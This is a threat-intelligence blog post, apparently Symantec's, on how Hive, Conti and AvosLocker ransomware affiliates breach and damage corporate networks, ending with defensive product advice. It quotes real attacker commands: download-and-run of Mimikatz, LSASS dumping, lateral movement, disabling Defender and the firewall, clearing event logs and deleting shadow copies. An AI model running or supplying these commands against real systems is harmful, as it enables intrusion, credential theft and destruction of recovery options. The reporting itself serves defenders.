Ransomware: How Attackers are Breaching Corporate
Networks
symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker

Targeted ransomware attacks continue to be one of the most critical cyber risks facing
organizations of all sizes. The tactics used by ransomware attackers are continually evolving,
but by identifying the most frequently employed tools, tactics, and procedures (TTPs)
organizations can gain a deeper understanding into how ransomware groups infiltrate
networks and use this knowledge to identify and prioritize areas of weakness.
Symantec, a division of Broadcom Software, tracks various ransomware threats; however,
the following three ransomware families are being observed in the majority of recent attacks:
Hive
Conti
Avoslocker
Similar to many other ransomware families, Hive, Conti, and Avoslocker follow the
ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware
operators hire affiliates who are responsible for launching the ransomware attacks on their
behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out
by the ransomware operators.
Once initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a
plethora of TTPs to help the operators achieve the following:
1/9

Gain persistence on the network
Escalate privileges
Tamper with and evade security software
Laterally move across the network

Initial Access
Affiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of
techniques to gain an initial foothold on victim networks. Some of these techniques include:
Spear phishing leading to the deployment of malware, including but not limited to:
IcedID
Emotet
QakBot
TrickBot
Taking advantage of weak RDP credentials
Exploiting vulnerabilities such as:
Microsoft Exchange vulnerabilities - CVE-2021-34473, CVE-2021-34523, CVE2021-31207, CVE-2021-26855
FortiGate firewall vulnerabilities - CVE-2018-13379 and CVE-2018-13374
Apache Log4j vulnerabily - CVE-2021-44228
In most cases, the spear-phishing emails contain Microsoft Word document attachments
embedded with macros that lead to the installation of one of the previously mentioned
malware threats. In some instances, attackers use this malware to install Cobalt Strike,
which is then used to pivot to other systems on the network. These malware threats are then
used to distribute ransomware onto compromised computers.

Persistence
After gaining initial access, Symantec has observed affiliates for all three ransomware
families using third-party software such as AnyDesk and ConnectWise Control (previously
known as ScreenConnect) to maintain access to victim networks. They also enable default
Remote Desktop access in the firewall:
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
Actors are also known to create additional users on compromised systems to maintain
access. In some instances we have seen threat actors add registry entries that allow them to
automatically log in when a machine is restarted:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
DefaultUserName /t REG_SZ /d <user> /f

2/9

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
AutoAdminLogon /t REG_SZ /d 1 /f

Discovery
During the discovery phase the ransomware actors try to sweep the victim’s network to
identify potential targets. Symantec has observed the aforementioned ransomware actors
using tools such as the following:
ADRecon - Gathers Active Directory information and generates a report
Netscan - Discovers devices on the network

Credential Access
Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no
exception. We have observed them using the PowerShell version of Mimikatz as well as the
PE version of the tool. There are also instances where the threat actors directly load the
PowerShell version of Mimikatz from GitHub repositories:
powershell IEX((new-object
net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/InvokeMimikatz.ps1'));Invoke-Mimikatz -DumpCreds
In addition to using Mimikatz, the threat actors have also taken advantage of the native
rundll32 and comsvcs.dll combination to dump the LSASS memory:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <process id> lsass.dmp full
Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract
credentials from the dump. In rare occasions they have also been observed using
taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable
credentials.

Lateral Movement
Attackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute
the ransomware on victim networks. We have also observed the attackers using several
other techniques to laterally move across networks.
PsExec
psexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\xxx.exe
WMI

3/9

wmic /node:@C:\share$\comps1.txt /user:"user" /password:"password" process call create
"cmd.exe /c bitsadmin /transfer xxx \\IP\share$\xxx.exe
%APPDATA%\xxx.exe&%APPDATA%\xxx.exe"
BITSAdmin
bitsadmin /transfer debjob /download /priority
normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\ele.dll
Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm
hash>"

Defense Evasion
As with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper
with various security products that interfere with their goal. We have observed them meddling
with security services using the net, taskkill, and sccommands to disable or terminate them.
In some cases they also use tools like PC Hunterto end processes. They have also been
seen tampering with various registry entries related to security products, since changes to
the registry entries can make those products inoperative.
Both Hive and AvosLocker have been observed attempting to disable Windows Defender
using the following reg.exe commands.
AvosLocker:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t
REG_DWORD /d 1 /f
Hive:
reg.exe delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware"
/t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t
REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v
"MpEnablePus" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v
"DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v
"DisableIOAVProtection" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v
"DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v

reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v
"DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v
"DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v
"DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v
"SpynetReporting" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v
"SubmitSamplesConsent" /t REG_DWORD /d "0" /f
reg.exe add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"
/v "Start" /t REG_DWORD /d "0" /f
reg.exe add
"HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t
REG_DWORD /d "0" /f
reg.exe delete
aHKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run” /v
“Windows Defender” /f
reg.exe delete “HKCU\Software\Microsoft\Windows\CurrentVersion\Run” /v “Windows
Defender” /
Disabling the default Windows firewall is also one of the techniques we have seen being
used by these ransomware families:
netsh advfirewall set allprofiles state off
To cover their tracks on a victim system the actors may also clear the Windows event log:
wevtutil.exe cl system

5/9

wevtutil.exe cl security
wevtutil.exe cl application
powershell -command "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"

Impact
Adversaries tend to disable or tamper with operating system settings in order to make it
difficult for administrators to recover data. Deleting shadow copies is a common tactic threat
actors perform before starting the encryption process. They perform this task by using tools
like Vssadmin or WMIC and running one of the following commands:
vssadmin.exe delete shadows /all /quiet
wmic.exe shadowcopy delete
We have also seen BCDEditbeing used to disable automatic system recovery and to ignore
failures on boot:
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
In some instances the actors delete the safe mode settings in the registry to stop security
product services from starting in safe mode:
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\<service> /f

Exfiltration
Attackers commonly exfiltrate critical data from a victim’s environment before encrypting it.
They then use the stolen data in an attempt to extort a ransom from victims. We have
observed threat actors using the following cloud services to exfiltrate data:
https://anonfiles.com
https://mega.nz
https://send.exploit.in
https://ufile.io
https://www.sendspace.com
We have also seen attackers use the following tools for data exfiltration:
Filezilla
Rclone

Conclusion
6/9

The TTPs outlined in this blog are a snapshot of the current ransomware threat landscape.
The TTPs used by these threat actors are constantly evolving, with groups continually
tweaking their methods in a bid to outmaneuver their targets’ security defenses. As such,
organizations need to be vigilant and employ a multi-layered security approach.

Intrusion Prevention System (IPS) detections
IPS blocks initial access, persistence, and lateral movement. SEP's Audit Signatures are
intended to raise awareness of potentially unwanted traffic on the network. By default, Audit
Signatures do not block. Administrators reviewing the logs of IPS events in their network can

7/9

note these Audit events and decide whether or not to configure the corresponding Audit
Signatures to block the traffic.
The following is a list of Audit Signatures that can be enabled to block, through policies,
activity related to the use of software or tools such as AnyDesk, ScreenConnect, and
PsExec.
Symantec recommends that you have intrusion prevention enabled on all your devices
including servers.
Adaptive Protection
Symantec Adaptive Protection can help protect against lateral movement and ransomware
execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and
BITSAdmin in your environment then you should “Deny” these applications and actions using
Symantec Adaptive Protection policies.
